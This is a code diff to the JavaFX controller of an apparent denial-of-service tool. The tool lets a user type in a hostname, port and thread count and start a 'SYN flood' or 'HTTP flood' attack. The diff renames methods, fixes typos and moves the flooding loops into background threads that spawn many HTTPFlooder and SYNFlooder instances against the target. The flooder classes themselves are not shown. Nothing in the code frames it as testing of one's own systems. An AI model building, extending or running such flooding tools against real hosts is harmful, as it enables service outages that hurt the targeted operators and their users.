@@ -8,7 +8,7 @@ package fxml.pkg1;
 import java.io.*;
 import java.net.*;
 import java.net.URL;
-import java.time.format.DateTimeFormatter;  
+import java.time.format.DateTimeFormatter;
 import java.time.LocalDateTime;    
 import java.util.ResourceBundle;
 
@@ -20,9 +20,6 @@ import java.net.URLConnection;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import javafx.application.Platform;
-import javafx.beans.value.ChangeListener;
-import javafx.beans.value.ObservableValue;
-import javafx.concurrent.Task;
 import javafx.fxml.FXML;
 import javafx.fxml.FXMLLoader;
 import javafx.fxml.Initializable;
@@ -37,7 +34,6 @@ import javafx.scene.control.TextArea;
 import javafx.scene.control.TextField;
 import javafx.scene.control.ToggleGroup;
 import javafx.scene.layout.AnchorPane;
-import javafx.scene.layout.BorderPane;
 import javafx.stage.Stage;
 import javafx.stage.StageStyle;
 import static javax.swing.JOptionPane.showMessageDialog;
@@ -103,7 +99,7 @@ public class MainAppFXMLController implements Initializable {
         
     }
     @FXML
-    public void checkport(ActionEvent event) throws IOException {
+    public void checkPort(ActionEvent event) throws IOException {
         boolean bol = checkInt();
         if (bol){
             if (port.getText().isEmpty()){
@@ -128,8 +124,8 @@ public class MainAppFXMLController implements Initializable {
         
     }
     @FXML
-    public void checkinternet(ActionEvent event) throws IOException {
-        String str3 = checkInterent();
+    public void checkInternet(ActionEvent event) throws IOException {
+        String str3 = checkInternet();
         output.appendText("["+dtf.format(now)+"]"+ str3+'\n');
     }
     @FXML
@@ -155,18 +151,29 @@ public class MainAppFXMLController implements Initializable {
                         output.appendText("["+dtf.format(now)+"]"+ "Starting SYN flood Attack..."+'\n');
                         gifloader();
                         makeProgress();
+                        new Thread(()-> {
+
+                            try {
+                                flooder2Thread();
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                        }).start();
+
                         
                     } else {
                         output.appendText("["+dtf.format(now)+"]"+ "Starting HTTP flood Attack..."+'\n');
 //                        gifloader();
 //                        makeProgress();
+                        new Thread(()-> {
+                            try {
+                                flooderThread();
+                            } catch (IOException | InterruptedException e) {
+                                e.printStackTrace();
+                            }
+                        }).start();
 
-                        for (int i = 0; i < Integer.parseInt(threads.getText()); i++){
-                            fdr = new HTTPFlooder(hostname.getText(), port.getText(), "tasks/api_create");
-                            fdr.jsonFlood();
-                            fdr.start();
-                            output.appendText("Thread "+i+" "+fdr.getConn(). getResponseCode()+ " "+fdr.getConn().getResponseMessage()+"\n");
-                        }
+
                     }
                 }else{
                     showMessageDialog(null, "Please Enter An Integer Number");
@@ -187,9 +194,8 @@ public class MainAppFXMLController implements Initializable {
         progress.setVisible(false);
         output.setStyle("-fx-control-inner-background: #404040; -fx-text-fill:lightgreen;");
     }   
-    public String sendPingRequest(String ipAddress)
-            throws UnknownHostException, IOException
-    {
+
+    public String sendPingRequest(String ipAddress) throws UnknownHostException, IOException {
         InetAddress geek = InetAddress.getByName(ipAddress);
         System.out.println("Sending Ping Request to " + ipAddress);
         if (geek.isReachable(5000)){
@@ -230,7 +236,7 @@ public class MainAppFXMLController implements Initializable {
         }
     }
     
-    public String checkInterent() throws IOException{
+    public String checkInternet() throws IOException{
         try {
             URL url = new URL("http://www.google.com");
             URLConnection connection = url.openConnection();
@@ -334,4 +340,20 @@ public class MainAppFXMLController implements Initializable {
         }
     }
 
+    public void flooderThread() throws IOException, InterruptedException {
+        for (int i = 0; i < Integer.parseInt(threads.getText()); i++){
+            fdr = new HTTPFlooder(hostname.getText(), port.getText(), "tasks/api_create");
+            fdr.jsonFlood();
+            fdr.start();
+            if(fdr.getConn().getResponseMessage()!=null) output.appendText("Thread "+fdr.getName()+" "+fdr.getConn(). getResponseCode()+ " "+fdr.getConn().getResponseMessage()+"\n");
+
+        }
+    }
+    public void flooder2Thread() throws IOException{
+        for (int i = 0; i < Integer.parseInt(threads.getText()); i++){
+            sdr = new SYNFlooder(hostname.getText(),Integer.parseInt(port.getText()));
+            sdr.start();
+            output.appendText("Thread "+i+" "+sdr.getSocket().isConnected()+ " "+sdr.getSocket().getInetAddress()+"\n");
+        }
+    }
 }
